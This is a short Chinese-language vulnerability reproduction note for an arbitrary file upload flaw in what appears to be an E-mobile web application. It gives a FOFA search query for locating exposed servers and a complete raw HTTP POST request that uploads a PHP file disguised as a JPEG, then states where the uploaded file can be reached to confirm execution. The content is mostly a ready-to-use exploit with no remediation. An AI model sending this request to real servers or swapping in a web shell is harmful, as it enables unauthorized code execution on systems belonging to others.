<a name="NpLPF"></a>
# 一、fofa搜索语法
```java
body="/newplugins/js/pnotify/jquery.pnotify.default.css"
```
<a name="TNcUl"></a>
# 三、漏洞复现
请求接口上传任意文件
```java
POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1
Host: your-ip
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close
Content-Length: 350

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="upload_quwan"; filename="1.php."
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/42988647/1719240352786-a3725668-6df0-45d2-a23b-2fa5811cff21.png#averageHue=%23fbfbfb&clientId=ud521e60a-9dae-4&from=paste&height=518&id=u66fee27d&originHeight=647&originWidth=1507&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=115847&status=done&style=none&taskId=uff74b4a2-b292-43e3-989f-1a0cd193097&title=&width=1205.6)<br />文件访问地址为回显中的/attachment/xxxxxx/1.php<br />![image.png](https://cdn.nlark.com/yuque/0/2024/png/42988647/1719240527145-cea0ef34-97b2-4764-8658-20ea3aeb77cd.png#clientId=ud521e60a-9dae-4&from=paste&height=715&id=u698c9c9e&originHeight=894&originWidth=1537&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=122229&status=done&style=none&taskId=ufe5b5554-1f11-4084-a72a-1aaa1e60483&title=&width=1229.6)<br />证明存在漏洞








